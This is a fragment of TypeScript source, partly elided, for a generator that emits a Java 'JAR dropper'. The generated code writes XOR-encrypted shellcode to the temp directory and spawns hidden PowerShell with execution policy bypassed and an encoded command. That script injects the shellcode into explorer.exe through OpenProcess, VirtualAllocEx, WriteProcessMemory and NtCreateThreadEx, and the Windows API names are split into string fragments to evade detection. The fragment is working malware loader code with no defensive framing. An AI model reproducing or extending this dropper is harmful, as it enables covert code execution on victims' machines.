...
function generateJarDropperSource(jarPersist: boolean): string {
  ...
  return [
    ...
    "    log(\"shellcode decoded: \"+sc.length+\" bytes, key=0x\"+Integer.toHexString(key));",
    "    String px=Long.toHexString(System.nanoTime());",
    "    File td=new File(System.getProperty(\"java.io.tmpdir\"));",
    "    File sf=new File(td,px+\".dat\");",
    "    try(FileOutputStream fo=new FileOutputStream(sf)){fo.write(raw);}",
    "    log(\"payload written (encrypted) to \"+sf.getAbsolutePath());",
    "    String sp=sf.getAbsolutePath().replace(\"\\\\\",\"\\\\\\\\\");",
    "    String dq=\"\\\"\";",
    "    String ntd=\"nt\"+\"dl\"+\"l\";",
    "    String k32=\"ke\"+\"rn\"+\"el\"+\"32\";",
    "    String nThread=\"NtCr\"+\"eat\"+\"eT\"+\"hre\"+\"adEx\";",
    "    String oProc=\"Op\"+\"en\"+\"Pro\"+\"cess\";",
    "    String vAllocEx=\"Vi\"+\"rtu\"+\"al\"+\"All\"+\"oc\"+\"Ex\";",
    "    String wProcMem=\"Wri\"+\"te\"+\"Pro\"+\"cess\"+\"Mem\"+\"ory\";",
    "    String td2=\"using System;using System.Runtime.InteropServices;public class N{\"",
    "      +\"[DllImport(\"+dq+k32+dq+\")]public static extern IntPtr \"+oProc+\"(uint a,bool b,int c);\"",
    "      +\"[DllImport(\"+dq+k32+dq+\")]public static extern IntPtr \"+vAllocEx+\"(IntPtr p,IntPtr a,uint s,uint t,uint f);\"",
    "      +\"[DllImport(\"+dq+k32+dq+\")]public static extern bool \"+wProcMem+\"(IntPtr p,IntPtr a,byte[]b,uint s,ref uint w);\"",
    "      +\"[DllImport(\"+dq+ntd+dq+\")]public static extern int \"+nThread+\"(ref IntPtr t,uint a,IntPtr o,IntPtr p,IntPtr e,IntPtr u,bool c,uint k,uint f,uint x,IntPtr q);}\";"  ,
    "    String lp=sf.getAbsolutePath().replace(\"\\\\\",\"\\\\\\\\\").replace(\".dat\",\".log\");",
    "    String ps=",
    "      \"function L($m){[IO.File]::AppendAllText('\"+lp+\"',(Get-Date -f 'HH:mm:ss')+' '+$m+\\\"\\\\n\\\")};\"",
    "      +\"L('ps started');\"",
    "      +\"$e=[IO.File]::ReadAllBytes('\"+sp+\"');\"",
    "      +\"L('read enc '+$e.Length+' bytes');\"",
    "      +\"$k=$e[0];$b=New-Object byte[]($e.Length-1);\"",
    "      +\"for($i=0;$i -lt $b.Length;$i++){$b[$i]=$e[$i+1] -bxor $k};\"",
    "      +\"L('decoded '+$b.Length+' bytes');\"",
    "      +\"$s=[uint32]$b.Length;\"",
    "      +\"try{Add-Type -TypeDefinition '\"+td2+\"';}catch{};\"",
    "      +\"$pid=(Get-Process explorer|Select -First 1).Id;\"",
    "      +\"L('target pid='+$pid);\"",
    "      +\"$ph=[N]::\"+oProc+\"(0x1FFFFF,$false,$pid);\"",
    "      +\"L('proc handle='+$ph);\"",
    "      +\"$ra=[N]::\"+vAllocEx+\"($ph,[IntPtr]::Zero,$s,0x3000,0x40);\"",
    "      +\"L('remote alloc='+$ra);\"",
    "      +\"$w=0u;[N]::\"+wProcMem+\"($ph,$ra,$b,$s,[ref]$w);\"",
    "      +\"L('wrote '+$w+' bytes');\"",
    "      +\"$t=[IntPtr]::Zero;\"",
    "      +\"$r=[N]::\"+nThread+\"([ref]$t,0x1FFFFF,[IntPtr]0,$ph,$ra,[IntPtr]0,$false,0,0,0,[IntPtr]0);\"",
    "      +\"L('thread ret='+$r+' handle='+$t);\"",
    ...
    "    String ep=sf.getAbsolutePath().replace(\".dat\",\".err\");",
    "    log(\"ps log will be at: \"+lp);",
    "    log(\"ps err will be at: \"+ep);",
    "    log(\"launching powershell\");",
    "    Process proc=new ProcessBuilder(\"powershell.exe\",\"-NoProfile\",\"-NonInteractive\",\"-WindowStyle\",\"Hidden\",\"-ExecutionPolicy\",\"Bypass\",\"-EncodedCommand\",enc)",
    "      .redirectError(new File(ep)).start();",
